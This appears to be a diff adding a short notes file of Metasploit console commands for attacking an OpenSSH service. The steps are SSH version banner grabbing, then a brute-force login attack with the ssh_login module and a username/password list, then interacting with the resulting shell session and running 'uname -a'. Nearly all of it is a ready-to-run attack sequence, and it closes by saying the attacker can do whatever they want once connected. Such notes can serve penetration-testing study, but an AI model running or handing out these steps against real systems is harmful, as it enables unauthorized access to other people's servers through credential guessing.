@@ -1,0 +1,47 @@
+#OpenSSH
+
+#First step will do banner grabbing 
+#Open new terminal and type 
+msfconsole
+
+#Use below exploit to check SSH version 
+use auxiliary/scanner/ssh/ssh_version
+
+#To set target
+
+set RHOSTS ip_address
+
+#To set Port
+set RPORT port_number
+
+#Now exploit
+
+exploit
+
+#Information about ssh will show up
+
+# Now will Exploit SSH through Brute Force Attack 
+
+#use below exploit to do the attack 
+use auxiliary/scanner/ssh/ssh_login
+
+#To set target
+
+set RHOSTS ip_address
+
+#To set Port
+set RPORT port_number
+
+#To set Usernames and passwords file for the attack
+set USERPASS_FILE /root/Desktop/ssh.txt
+
+#Now exploit
+exploit
+
+#Based on Result you can proceed to next step
+#if we got open session  use below command to interact with it
+sessions -i session_number
+
+# Now you are connected and you can do what every you want
+#To check linux version
+uname -a 
